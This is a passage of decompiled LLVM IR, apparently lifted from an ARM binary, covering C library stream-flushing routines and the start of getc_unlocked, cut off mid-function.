  %v0_17d10.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17d14.pre = load i32, i32* @r4, align 4
  %v1_17d10 = inttoptr i32 %v0_17d10.pre to i32*
  %v2_17d10 = load i32, i32* %v1_17d10, align 4
  store i32 %v2_17d10, i32* %r3.global-to-local, align 4
  %v3_17d14 = icmp uge i32 %v2_17d10, %v1_17d14.pre
  store i1 %v3_17d14, i1* %cpsr_c.global-to-local, align 1
  %v9_17d14 = icmp eq i32 %v2_17d10, %v1_17d14.pre
  br i1 %v9_17d14, label %dec_label_pc_17d1c, label %dec_label_pc_17d34

dec_label_pc_17d30:                               ; preds = %dec_label_pc_17d1c
  %v0_17d30 = load i32, i32* @r4, align 4
  store i32 %v0_17d30, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17d34

dec_label_pc_17d34:                               ; preds = %dec_label_pc_17d04, %dec_label_pc_17d1c.dec_label_pc_17d10_crit_edge, %dec_label_pc_17d30
  %v0_17d3c = phi i32 [ %v0_17d30, %dec_label_pc_17d30 ], [ %v2_17d10111, %dec_label_pc_17d04 ], [ %v2_17d10, %dec_label_pc_17d1c.dec_label_pc_17d10_crit_edge ]
  %v1_17d34 = phi i32 [ %v0_17d30, %dec_label_pc_17d30 ], [ %v2_17d04, %dec_label_pc_17d04 ], [ %v1_17d14.pre, %dec_label_pc_17d1c.dec_label_pc_17d10_crit_edge ]
  %v3_17d34 = icmp uge i32 %v0_17d3c, %v1_17d34
  store i1 %v3_17d34, i1* %cpsr_c.global-to-local, align 1
  %v9_17d34 = icmp eq i32 %v0_17d3c, %v1_17d34
  br i1 %v9_17d34, label %dec_label_pc_17d3c, label %dec_label_pc_17d34.dec_label_pc_17d04_crit_edge

dec_label_pc_17d34.dec_label_pc_17d04_crit_edge:  ; preds = %dec_label_pc_17d34
  %v0_17d04.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_17d04

dec_label_pc_17d3c:                               ; preds = %dec_label_pc_17d34
  %v2_17d3c = icmp ne i32 %v1_17d34, 0
  store i1 %v2_17d3c, i1* %cpsr_c.global-to-local, align 1
  %v7_17d40 = icmp slt i32 %v1_17d34, 2
  br i1 %v7_17d40, label %dec_label_pc_17d5cthread-pre-split, label %dec_label_pc_17d44

dec_label_pc_17d44:                               ; preds = %dec_label_pc_17d3c
  %v0_17d44 = load i32, i32* @r7, align 4
  store i32 %v0_17d44, i32* %r0.global-to-local, align 4
  %v0_17d48 = load i32, i32* %r1.global-to-local, align 4
  %v1_17d48 = add i32 %v0_17d48, 129
  store i32 %v1_17d48, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17d5cthread-pre-split

dec_label_pc_17d5cthread-pre-split:               ; preds = %dec_label_pc_17d3c, %dec_label_pc_17d44
  %v0_17ea8.pr.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_17d5c

dec_label_pc_17d5c:                               ; preds = %dec_label_pc_17d5cthread-pre-split, %dec_label_pc_17cdc
  %v0_17ea8.pr = phi i32 [ %v0_17ea8.pr.pr, %dec_label_pc_17d5cthread-pre-split ], [ %v2_17cf4, %dec_label_pc_17cdc ]
  store i32 92, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17ea818 = icmp eq i32 %v0_17ea8.pr, 0
  br i1 %v2_17ea818, label %dec_label_pc_17eb0, label %dec_label_pc_17d6c

dec_label_pc_17d6c:                               ; preds = %dec_label_pc_17d5c, %dec_label_pc_17ea4
  %v0_17d94 = phi i32 [ %v3_17ea4, %dec_label_pc_17ea4 ], [ %v0_17ea8.pr, %dec_label_pc_17d5c ]
  %v1_17d6c = inttoptr i32 %v0_17d94 to i16*
  %v2_17d6c = load i16, i16* %v1_17d6c, align 2
  %v3_17d6c = zext i16 %v2_17d6c to i32
  store i32 %v3_17d6c, i32* %r3.global-to-local, align 4
  %v1_17d70 = and i32 %v3_17d6c, 64
  %v2_17d70 = icmp eq i32 %v1_17d70, 0
  br i1 %v2_17d70, label %dec_label_pc_17ea4, label %dec_label_pc_17d78

dec_label_pc_17d78:                               ; preds = %dec_label_pc_17d6c
  %v0_17d78 = load i32, i32* @r6, align 4
  %v1_17d78 = load i32, i32* %sb.global-to-local, align 4
  %v2_17d78 = add i32 %v1_17d78, %v0_17d78
  %v3_17d78 = inttoptr i32 %v2_17d78 to i32*
  %v4_17d78 = load i32, i32* %v3_17d78, align 4
  store i32 %v4_17d78, i32* %r3.global-to-local, align 4
  %v1_17d7c = inttoptr i32 %v4_17d78 to i32*
  %v2_17d7c = load i32, i32* %v1_17d7c, align 4
  store i32 %v2_17d7c, i32* %r3.global-to-local, align 4
  %v2_17d80 = icmp ugt i32 %v2_17d7c, 1
  store i1 %v2_17d80, i1* %cpsr_c.global-to-local, align 1
  %v7_17d80 = icmp eq i32 %v2_17d7c, 2
  br i1 %v7_17d80, label %dec_label_pc_17de4, label %dec_label_pc_17d88

dec_label_pc_17d88:                               ; preds = %dec_label_pc_17d78
  %v1_17d88 = add i32 %v0_17d94, 64
  %v2_17d88 = inttoptr i32 %v1_17d88 to i32*
  %v3_17d88 = load i32, i32* %v2_17d88, align 4
  store i32 %v3_17d88, i32* %r3.global-to-local, align 4
  %v1_17d8c = load i32, i32* %r8.global-to-local, align 4
  %v3_17d8c = icmp uge i32 %v3_17d88, %v1_17d8c
  store i1 %v3_17d8c, i1* %cpsr_c.global-to-local, align 1
  %v9_17d8c = icmp eq i32 %v3_17d88, %v1_17d8c
  br i1 %v9_17d8c, label %dec_label_pc_17dd8, label %dec_label_pc_17d94

dec_label_pc_17d94:                               ; preds = %dec_label_pc_17d88
  %v1_17d94 = add i32 %v0_17d94, 56
  store i32 %v1_17d94, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_17d94, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_17da486 = inttoptr i32 %v1_17d94 to i32*
  %v2_17da487 = load i32, i32* %v1_17da486, align 4
  store i32 %v2_17da487, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_17da894 = icmp eq i32 %v2_17da487, 0
  br i1 %v9_17da894, label %dec_label_pc_17db0, label %dec_label_pc_17dc8

dec_label_pc_17db0:                               ; preds = %dec_label_pc_17d94, %dec_label_pc_17db0.dec_label_pc_17da4_crit_edge
  %v0_17db095 = phi i32 [ %v1_17da8.pre, %dec_label_pc_17db0.dec_label_pc_17da4_crit_edge ], [ 0, %dec_label_pc_17d94 ]
  store i32 %v0_17db095, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17dc0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17dc0, label %dec_label_pc_17dc4, label %dec_label_pc_17db0.dec_label_pc_17da4_crit_edge

dec_label_pc_17db0.dec_label_pc_17da4_crit_edge:  ; preds = %dec_label_pc_17db0
  %v0_17da4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17da8.pre = load i32, i32* @r4, align 4
  %v1_17da4 = inttoptr i32 %v0_17da4.pre to i32*
  %v2_17da4 = load i32, i32* %v1_17da4, align 4
  store i32 %v2_17da4, i32* %r3.global-to-local, align 4
  %v3_17da8 = icmp uge i32 %v2_17da4, %v1_17da8.pre
  store i1 %v3_17da8, i1* %cpsr_c.global-to-local, align 1
  %v9_17da8 = icmp eq i32 %v2_17da4, %v1_17da8.pre
  br i1 %v9_17da8, label %dec_label_pc_17db0, label %dec_label_pc_17dc8

dec_label_pc_17dc4:                               ; preds = %dec_label_pc_17db0
  %v0_17dc4 = load i32, i32* @r4, align 4
  store i32 %v0_17dc4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17dc8

dec_label_pc_17dc8:                               ; preds = %dec_label_pc_17d94, %dec_label_pc_17db0.dec_label_pc_17da4_crit_edge, %dec_label_pc_17dc4
  %v0_17dc8 = phi i32 [ %v0_17dc4, %dec_label_pc_17dc4 ], [ %v2_17da487, %dec_label_pc_17d94 ], [ %v2_17da4, %dec_label_pc_17db0.dec_label_pc_17da4_crit_edge ]
  %v1_17dc8 = phi i32 [ %v0_17dc4, %dec_label_pc_17dc4 ], [ 0, %dec_label_pc_17d94 ], [ %v1_17da8.pre, %dec_label_pc_17db0.dec_label_pc_17da4_crit_edge ]
  %v3_17dc8 = icmp uge i32 %v0_17dc8, %v1_17dc8
  store i1 %v3_17dc8, i1* %cpsr_c.global-to-local, align 1
  %v9_17dc8 = icmp eq i32 %v0_17dc8, %v1_17dc8
  br i1 %v9_17dc8, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_17dc8
  %v1_17dcc = load i32, i32* @r7, align 4
  store i32 %v1_17dcc, i32* %r0.global-to-local, align 4
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_17dc8, %bb69
  %v1_17dd0 = xor i1 %v9_17dc8, true
  call void @__pseudo_cond_branch(i1 %v1_17dd0, i32 ptrtoint (i32* @global_var_154bc.522 to i32))
  %v0_17dd4 = load i32, i32* %r8.global-to-local, align 4
  %v1_17dd4 = load i32, i32* @r5, align 4
  %v2_17dd4 = add i32 %v1_17dd4, 64
  %v3_17dd4 = inttoptr i32 %v2_17dd4 to i32*
  store i32 %v0_17dd4, i32* %v3_17dd4, align 4
  %v0_17dd8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17dd8

dec_label_pc_17dd8:                               ; preds = %dec_label_pc_17d88, %bb70
  %v0_17dd8 = phi i32 [ %v0_17d94, %dec_label_pc_17d88 ], [ %v0_17dd8.pre, %bb70 ]
  %v1_17dd8 = add i32 %v0_17dd8, 60
  %v2_17dd8 = inttoptr i32 %v1_17dd8 to i32*
  %v3_17dd8 = load i32, i32* %v2_17dd8, align 4
  %v1_17ddc = add i32 %v3_17dd8, 1
  store i32 %v1_17ddc, i32* %r3.global-to-local, align 4
  store i32 %v1_17ddc, i32* %v2_17dd8, align 4
  %v0_17de4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17de4

dec_label_pc_17de4:                               ; preds = %dec_label_pc_17d78, %dec_label_pc_17dd8
  %v0_17dfc = phi i32 [ %v0_17d94, %dec_label_pc_17d78 ], [ %v0_17de4.pre, %dec_label_pc_17dd8 ]
  %v1_17de4 = inttoptr i32 %v0_17dfc to i16*
  %v2_17de4 = load i16, i16* %v1_17de4, align 2
  %v3_17de4 = zext i16 %v2_17de4 to i32
  store i32 %stack_var_-44.1, i32* %r2.global-to-local, align 4
  %v2_17dec = or i32 %v3_17de4, %stack_var_-44.1
  %v1_17df0 = xor i32 %v2_17dec, 320
  store i32 %v1_17df0, i32* %r3.global-to-local, align 4
  %v1_17df4 = and i32 %v1_17df0, 832
  %v2_17df4 = icmp eq i32 %v1_17df4, 0
  br i1 %v2_17df4, label %dec_label_pc_17dfc, label %bb71

dec_label_pc_17dfc:                               ; preds = %dec_label_pc_17de4
  store i32 %v0_17dfc, i32* %r0.global-to-local, align 4
  %v1_17e00 = call i32 @__stdio_wcommit(i32 %v0_17dfc)
  store i32 %v1_17e00, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17e04 = icmp eq i32 %v1_17e00, 0
  br i1 %v2_17e04, label %.thread6, label %.thread7

.thread6:                                         ; preds = %dec_label_pc_17dfc
  %v1_17e08 = load i32, i32* @r5, align 4
  %v2_17e08 = inttoptr i32 %v1_17e08 to i16*
  %v3_17e08 = load i16, i16* %v2_17e08, align 2
  %v4_17e08 = zext i16 %v3_17e08 to i32
  store i32 %v4_17e08, i32* %r3.global-to-local, align 4
  %v2_17e0c = add i32 %v1_17e08, 8
  %v3_17e0c = inttoptr i32 %v2_17e0c to i32*
  %v4_17e0c = load i32, i32* %v3_17e0c, align 4
  store i32 %v4_17e0c, i32* %r2.global-to-local, align 4
  %v2_17e10 = and i32 %v4_17e08, 65471
  store i32 %v2_17e10, i32* %r3.global-to-local, align 4
  %v3_17e14 = add i32 %v1_17e08, 28
  %v4_17e14 = inttoptr i32 %v3_17e14 to i32*
  store i32 %v4_17e0c, i32* %v4_17e14, align 4
  %v1_17e18 = load i32, i32* %r3.global-to-local, align 4
  %v2_17e18 = trunc i32 %v1_17e18 to i16
  %v3_17e18 = load i32, i32* @r5, align 4
  %v4_17e18 = inttoptr i32 %v3_17e18 to i16*
  store i16 %v2_17e18, i16* %v4_17e18, align 2
  br label %bb71

.thread7:                                         ; preds = %dec_label_pc_17dfc
  %v1_17e1c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_17e1c, i32* %sl.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %.thread6, %dec_label_pc_17de4, %.thread7
  %v0_17e20 = load i32, i32* @r6, align 4
  %v1_17e20 = load i32, i32* %sb.global-to-local, align 4
  %v2_17e20 = add i32 %v1_17e20, %v0_17e20
  %v3_17e20 = inttoptr i32 %v2_17e20 to i32*
  %v4_17e20 = load i32, i32* %v3_17e20, align 4
  store i32 %v4_17e20, i32* %r3.global-to-local, align 4
  %v1_17e24 = inttoptr i32 %v4_17e20 to i32*
  %v2_17e24 = load i32, i32* %v1_17e24, align 4
  store i32 %v2_17e24, i32* %r3.global-to-local, align 4
  %v2_17e28 = icmp ugt i32 %v2_17e24, 1
  store i1 %v2_17e28, i1* %cpsr_c.global-to-local, align 1
  %v7_17e28 = icmp eq i32 %v2_17e24, 2
  br i1 %v7_17e28, label %dec_label_pc_17ea4, label %dec_label_pc_17e30

dec_label_pc_17e30:                               ; preds = %bb71
  %v0_17e30 = load i32, i32* @r5, align 4
  %v1_17e30 = add i32 %v0_17e30, 60
  %v2_17e30 = inttoptr i32 %v1_17e30 to i32*
  %v3_17e30 = load i32, i32* %v2_17e30, align 4
  %v1_17e34 = add i32 %v3_17e30, -1
  store i32 %v1_17e34, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17e38 = icmp eq i32 %v1_17e34, 0
  store i32 %v1_17e34, i32* %v2_17e30, align 4
  br i1 %v2_17e38, label %dec_label_pc_17e44, label %dec_label_pc_17ea4

dec_label_pc_17e44:                               ; preds = %dec_label_pc_17e30
  %v0_17e44 = load i32, i32* %r3.global-to-local, align 4
  %v1_17e44 = load i32, i32* @r5, align 4
  %v2_17e44 = add i32 %v1_17e44, 64
  %v3_17e44 = inttoptr i32 %v2_17e44 to i32*
  store i32 %v0_17e44, i32* %v3_17e44, align 4
  %v0_17e48 = load i32, i32* @r5, align 4
  %v1_17e48 = add i32 %v0_17e48, 56
  store i32 %v1_17e48, i32* @r7, align 4
  br label %dec_label_pc_17e4c

dec_label_pc_17e4c:                               ; preds = %dec_label_pc_17e7c.dec_label_pc_17e4c_crit_edge, %dec_label_pc_17e44
  %v0_17e54 = phi i32 [ %v0_17e54.pre, %dec_label_pc_17e7c.dec_label_pc_17e4c_crit_edge ], [ %v1_17e48, %dec_label_pc_17e44 ]
  %v0_17e4c = phi i32 [ %v0_17e4c.pre, %dec_label_pc_17e7c.dec_label_pc_17e4c_crit_edge ], [ %v0_17e48, %dec_label_pc_17e44 ]
  %v1_17e4c = add i32 %v0_17e4c, 56
  %v2_17e4c = inttoptr i32 %v1_17e4c to i32*
  %v3_17e4c = load i32, i32* %v2_17e4c, align 4
  store i32 %v3_17e4c, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_17e54, i32* %r2.global-to-local, align 4
  %v1_17e5897 = inttoptr i32 %v0_17e54 to i32*
  %v2_17e5898 = load i32, i32* %v1_17e5897, align 4
  store i32 %v2_17e5898, i32* %r3.global-to-local, align 4
  %v3_17e5c100 = icmp uge i32 %v2_17e5898, %v3_17e4c
  store i1 %v3_17e5c100, i1* %cpsr_c.global-to-local, align 1
  %v9_17e5c106 = icmp eq i32 %v2_17e5898, %v3_17e4c
  br i1 %v9_17e5c106, label %dec_label_pc_17e64, label %dec_label_pc_17e7c

dec_label_pc_17e64:                               ; preds = %dec_label_pc_17e4c, %dec_label_pc_17e64.dec_label_pc_17e58_crit_edge
  %v0_17e64107 = phi i32 [ %v1_17e5c.pre, %dec_label_pc_17e64.dec_label_pc_17e58_crit_edge ], [ %v3_17e4c, %dec_label_pc_17e4c ]
  store i32 %v0_17e64107, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17e74 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17e74, label %dec_label_pc_17e78, label %dec_label_pc_17e64.dec_label_pc_17e58_crit_edge

dec_label_pc_17e64.dec_label_pc_17e58_crit_edge:  ; preds = %dec_label_pc_17e64
  %v0_17e58.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17e5c.pre = load i32, i32* @r4, align 4
  %v1_17e58 = inttoptr i32 %v0_17e58.pre to i32*
  %v2_17e58 = load i32, i32* %v1_17e58, align 4
  store i32 %v2_17e58, i32* %r3.global-to-local, align 4
  %v3_17e5c = icmp uge i32 %v2_17e58, %v1_17e5c.pre
  store i1 %v3_17e5c, i1* %cpsr_c.global-to-local, align 1
  %v9_17e5c = icmp eq i32 %v2_17e58, %v1_17e5c.pre
  br i1 %v9_17e5c, label %dec_label_pc_17e64, label %dec_label_pc_17e7c

dec_label_pc_17e78:                               ; preds = %dec_label_pc_17e64
  %v0_17e78 = load i32, i32* @r4, align 4
  store i32 %v0_17e78, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17e7c

dec_label_pc_17e7c:                               ; preds = %dec_label_pc_17e4c, %dec_label_pc_17e64.dec_label_pc_17e58_crit_edge, %dec_label_pc_17e78
  %v0_17e84 = phi i32 [ %v0_17e78, %dec_label_pc_17e78 ], [ %v2_17e5898, %dec_label_pc_17e4c ], [ %v2_17e58, %dec_label_pc_17e64.dec_label_pc_17e58_crit_edge ]
  %v1_17e7c = phi i32 [ %v0_17e78, %dec_label_pc_17e78 ], [ %v3_17e4c, %dec_label_pc_17e4c ], [ %v1_17e5c.pre, %dec_label_pc_17e64.dec_label_pc_17e58_crit_edge ]
  %v3_17e7c = icmp uge i32 %v0_17e84, %v1_17e7c
  store i1 %v3_17e7c, i1* %cpsr_c.global-to-local, align 1
  %v9_17e7c = icmp eq i32 %v0_17e84, %v1_17e7c
  br i1 %v9_17e7c, label %dec_label_pc_17e84, label %dec_label_pc_17e7c.dec_label_pc_17e4c_crit_edge

dec_label_pc_17e7c.dec_label_pc_17e4c_crit_edge:  ; preds = %dec_label_pc_17e7c
  %v0_17e4c.pre = load i32, i32* @r5, align 4
  %v0_17e54.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_17e4c

dec_label_pc_17e84:                               ; preds = %dec_label_pc_17e7c
  %v2_17e84 = icmp ne i32 %v1_17e7c, 0
  store i1 %v2_17e84, i1* %cpsr_c.global-to-local, align 1
  %v7_17e88 = icmp slt i32 %v1_17e7c, 2
  br i1 %v7_17e88, label %dec_label_pc_17ea4, label %dec_label_pc_17e8c

dec_label_pc_17e8c:                               ; preds = %dec_label_pc_17e84
  %v0_17e8c = load i32, i32* @r5, align 4
  %v1_17e8c = add i32 %v0_17e8c, 56
  store i32 %v1_17e8c, i32* %r0.global-to-local, align 4
  %v0_17e90 = load i32, i32* %r1.global-to-local, align 4
  %v1_17e90 = add i32 %v0_17e90, 129
  store i32 %v1_17e90, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17ea4

dec_label_pc_17ea4:                               ; preds = %dec_label_pc_17e30, %dec_label_pc_17e8c, %dec_label_pc_17e84, %bb71, %dec_label_pc_17d6c
  %v0_17ea4 = load i32, i32* @r5, align 4
  %v1_17ea4 = add i32 %v0_17ea4, 32
  %v2_17ea4 = inttoptr i32 %v1_17ea4 to i32*
  %v3_17ea4 = load i32, i32* %v2_17ea4, align 4
  store i32 %v3_17ea4, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17ea8 = icmp eq i32 %v3_17ea4, 0
  br i1 %v2_17ea8, label %dec_label_pc_17eb0, label %dec_label_pc_17d6c

dec_label_pc_17eb0:                               ; preds = %dec_label_pc_17ea4, %dec_label_pc_17d5c
  %v0_17eb0 = call i32 @_stdio_openlist_dec_use()
  store i32 %v0_17eb0, i32* %r0.global-to-local, align 4
  %v0_17eec.pre = load i32, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_17eb8:                               ; preds = %dec_label_pc_17b94
  %v3_17eb8 = load i16, i16* %arg1, align 2
  %v4_17eb8 = zext i16 %v3_17eb8 to i32
  %v1_17ebc = and i32 %v4_17eb8, 64
  store i32 %v1_17ebc, i32* %r3.global-to-local, align 4
  %v2_17ebc = icmp eq i32 %v1_17ebc, 0
  br i1 %v2_17ebc, label %bb72, label %dec_label_pc_17ec8

bb72:                                             ; preds = %dec_label_pc_17eb8
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_17ec8:                               ; preds = %dec_label_pc_17eb8
  %v2_17ec8 = call i32 @__stdio_wcommit(i32 %tmp)
  store i32 %v2_17ec8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17ecc = icmp eq i32 %v2_17ec8, 0
  br i1 %v2_17ecc, label %.thread14, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_17ec8
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb73

.thread14:                                        ; preds = %dec_label_pc_17ec8
  %v1_17ed0 = load i32, i32* @r4, align 4
  %v2_17ed0 = inttoptr i32 %v1_17ed0 to i16*
  %v3_17ed0 = load i16, i16* %v2_17ed0, align 2
  %v4_17ed0 = zext i16 %v3_17ed0 to i32
  store i32 %v4_17ed0, i32* %r3.global-to-local, align 4
  %v2_17ed4 = add i32 %v1_17ed0, 8
  %v3_17ed4 = inttoptr i32 %v2_17ed4 to i32*
  %v4_17ed4 = load i32, i32* %v3_17ed4, align 4
  store i32 %v4_17ed4, i32* %r2.global-to-local, align 4
  %v2_17ed8 = and i32 %v4_17ed0, 65471
  store i32 %v2_17ed8, i32* %r3.global-to-local, align 4
  %v2_17edc = trunc i32 %v2_17ed8 to i16
  store i16 %v2_17edc, i16* %v2_17ed0, align 2
  %v1_17ee0 = load i32, i32* %r2.global-to-local, align 4
  %v2_17ee0 = load i32, i32* @r4, align 4
  %v3_17ee0 = add i32 %v2_17ee0, 28
  %v4_17ee0 = inttoptr i32 %v3_17ee0 to i32*
  store i32 %v1_17ee0, i32* %v4_17ee0, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

bb73:                                             ; preds = %bb72, %.thread16, %dec_label_pc_17eb0, %.thread14
  %v0_17eec = phi i32 [ -1, %.thread16 ], [ 0, %bb72 ], [ %v0_17eec.pre, %dec_label_pc_17eb0 ], [ 0, %.thread14 ]
  store i32 %v0_17eec, i32* %r0.global-to-local, align 4
  store i32 %v6_17b68, i32* %r5.global-to-local, align 4
  ret i32 %v0_17eec

; uselistorder directives
  uselistorder i32 %v0_17eec, { 1, 0 }
  uselistorder i32 %v3_17ea4, { 1, 2, 0 }
  uselistorder i32 %v0_17e78, { 1, 0, 2 }
  uselistorder i32 %v1_17e5c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17dfc, { 1, 0, 2 }
  uselistorder i32 %v0_17dc4, { 1, 0, 2 }
  uselistorder i32 %v1_17da8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_17d8c, { 1, 0 }
  uselistorder i32 %v0_17d30, { 1, 0, 2 }
  uselistorder i32 %v1_17d14.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17d04, { 1, 0 }
  uselistorder i32 %v0_17cc8, { 1, 0, 2 }
  uselistorder i32 %v1_17cac.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_17c94, { 1, 0 }
  uselistorder i32 %v0_17c5c, { 1, 0, 2 }
  uselistorder i32 %v1_17c40.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17c30, { 1, 0 }
  uselistorder i32 %v0_17bec, { 1, 0, 2 }
  uselistorder i32 %v1_17bd0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_17ba8, { 2, 1, 0, 3 }
  uselistorder i32 %tmp, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %sl.global-to-local, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 53, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 55, 20, 21, 22, 23, 24, 25, 27, 26, 0, 28, 29, 30, 31, 33, 32, 52, 34, 35, 36, 37, 39, 38, 51, 40, 41, 42, 43, 45, 44, 54, 46, 47, 50, 48, 49 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 5, 3, 4, 22, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 11, 1, 2, 3, 35, 36, 4, 5, 6, 7, 8, 37, 38, 9, 10, 30, 12, 13, 14, 39, 40, 15, 16, 17, 33, 34, 18, 19, 20, 21, 28, 29, 22, 23, 24, 31, 32, 25, 26, 27 }
  uselistorder i32 92, { 0, 1, 2, 6, 3, 4, 7, 5, 8 }
  uselistorder i32 152, { 1, 3, 2, 4, 5, 8, 6, 9, 7, 10, 0, 11, 12, 14, 13, 15, 18, 16, 19, 17, 20, 22, 21, 23 }
  uselistorder i32 129, { 7, 8, 9, 5, 6, 10, 11, 0, 1, 2, 3, 4, 13, 14, 12 }
  uselistorder i32 -61504, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 34, 35, 36, 32, 33 }
  uselistorder i32 -61441, { 16, 17, 18, 19, 20, 21, 12, 13, 14, 15, 22, 23, 24, 25, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 32, 26, 27, 28, 29, 30, 31 }
  uselistorder label %bb73, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_17ea4, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_17e7c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17e64, { 1, 0 }
  uselistorder label %bb71, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17de4, { 1, 0 }
  uselistorder label %dec_label_pc_17dd8, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %dec_label_pc_17dc8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17db0, { 1, 0 }
  uselistorder label %dec_label_pc_17d6c, { 1, 0 }
  uselistorder label %dec_label_pc_17d5cthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_17d34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17d1c, { 1, 0 }
  uselistorder label %dec_label_pc_17cdc, { 1, 0 }
  uselistorder label %bb68, { 1, 0 }
  uselistorder label %dec_label_pc_17ccc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17cb4, { 1, 0 }
  uselistorder label %dec_label_pc_17c88, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17c60, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17c48, { 1, 0 }
  uselistorder label %dec_label_pc_17c00, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %dec_label_pc_17bf0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17bd8, { 1, 0 }
  uselistorder label %dec_label_pc_17ba4, { 1, 0 }
}

define i32 @function_17f00(i32 %arg1) local_unnamed_addr {
dec_label_pc_17f00:
  %v0_17f00 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17f00, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_17f00
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_17f00, %bb
  %v10_17f10 = phi i32 [ %arg1, %dec_label_pc_17f00 ], [ 0, %bb ]
  ret i32 %v10_17f10

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_17f14 = load i32, i32* @r4, align 4
  store i32 %v3_17f14, i32* %stack_var_-12, align 4
  %v6_17f14 = load i32, i32* @r5, align 4
  %v9_17f14 = load i32, i32* @lr, align 4
  %v0_17f18 = load i32, i32* @r0, align 4
  %v1_17f18 = add i32 %v0_17f18, 16
  %v2_17f18 = inttoptr i32 %v1_17f18 to i32*
  %v3_17f18 = load i32, i32* %v2_17f18, align 4
  store i32 %v3_17f18, i32* %r2.global-to-local, align 4
  %v1_17f1c = add i32 %v0_17f18, 24
  %v2_17f1c = inttoptr i32 %v1_17f1c to i32*
  %v3_17f1c = load i32, i32* %v2_17f1c, align 4
  %v3_17f20 = icmp ult i32 %v3_17f18, %v3_17f1c
